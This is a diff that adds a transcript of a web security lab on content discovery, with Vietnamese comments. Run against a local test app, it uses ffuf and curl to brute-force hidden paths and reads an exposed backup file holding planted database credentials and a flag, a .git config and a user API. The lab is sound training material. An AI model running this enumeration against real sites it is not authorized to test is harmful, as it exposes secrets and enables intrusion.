@@ -1,0 +1,40 @@
+# Transcript lab 1.3 - Content discovery
+# Chay that ngay 2026-10-18T10:19:21Z
+# App: python3 app.py (127.0.0.1:8011) | ffuf 2.1.0-dev | curl 7.81
+
+# Buoc 1: trang chu chi lo / va /about, khong link toi route an nao
+$ curl -s http://127.0.0.1:8011/ | grep -o "href=\"[^\"]*\""
+href="/"
+href="/about"
+
+====================================================================
+# Buoc 2: brute-force duong dan bang ffuf, loc bo cac phan hoi 404
+$ ffuf -w wordlist.txt -u http://127.0.0.1:8011/FUZZ -fc 404 -c
+about                   [Status: 200, Size: 292, Words: 23, Lines: 5, Duration: 4ms]
+admin                   [Status: 200, Size: 300, Words: 23, Lines: 5, Duration: 10ms]
+.git/config             [Status: 200, Size: 103, Words: 6, Lines: 5, Duration: 14ms]
+old                     [Status: 200, Size: 300, Words: 25, Lines: 5, Duration: 17ms]
+backup                  [Status: 200, Size: 124, Words: 6, Lines: 6, Duration: 18ms]
+
+====================================================================
+# Buoc 3: xac nhan tung route bang curl
+$ curl -s http://127.0.0.1:8011/backup
+# config.bak - lo ra ngoai
+DB_HOST=127.0.0.1
+DB_USER=acme
+DB_PASS=sup3r-s3cr3t-pw
+FLAG=WEB{content_discovery_tim_ra_backup}
+$ curl -s http://127.0.0.1:8011/.git/config
+[core]
+	repositoryformatversion = 0
+[remote "origin"]
+	url = https://github.com/acme/internal-site.git
+
+# Buoc 4: tu /api thu doan sau hon (ffuf khong ra vi wordlist nong)
+$ curl -s -o /dev/null -w "%{http_code}  /api\n"      http://127.0.0.1:8011/api
+404  /api
+$ curl -s -o /dev/null -w "%{http_code}  /api/v1/users\n" http://127.0.0.1:8011/api/v1/users
+200  /api/v1/users
+$ curl -s http://127.0.0.1:8011/api/v1/users
+[{"id":1,"role":"superuser","user":"admin"},{"id":2,"role":"staff","user":"alice"}]
+
